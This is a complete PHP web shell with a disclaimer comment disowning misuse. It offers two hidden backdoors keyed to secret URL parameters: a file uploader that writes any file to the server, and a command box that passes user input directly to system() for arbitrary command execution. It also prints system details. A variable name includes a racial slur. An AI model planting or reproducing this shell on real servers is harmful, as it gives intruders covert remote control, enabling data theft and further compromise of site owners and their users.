
<?php
//Use At Own Risk
//I am not responsible for all misuse of this script because this script is open source, 
//it means that there are many possibilities for many irresponsible parties to misuse this script.

//hidden uploader
if(isset($_GET["HiddenU"]))
{
echo "<pre>";
echo "<center><h1>Uploader</h1>";
echo "<font color=#000000>".php_uname()."  ";
echo "<form method=post enctype=multipart/form-data>";
echo "<input type=file name=f><input name=k type=submit id=k value=upload><br>";
if($_POST["k"]==upload)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
echo"<b>".$_FILES["f"]["name"];
}else{
echo"<b>Upload Fail";}}}
echo "</pre>";

//hidden cmd
if(isset($_REQUEST['HiddenX'])){
echo "<pre>";
echo "<center><h1>CMD</h1>";
echo "<font color=#000000>".php_uname()."  ";
echo "<form name='form' action='#' method='post'>
<input type='text' name='coba'/> <input type='submit' value='enter'/>
</form>";
$shellnigga2099X = ($_POST['coba']);
system($shellnigga2099X);
echo "</pre>";
die;
}

?>
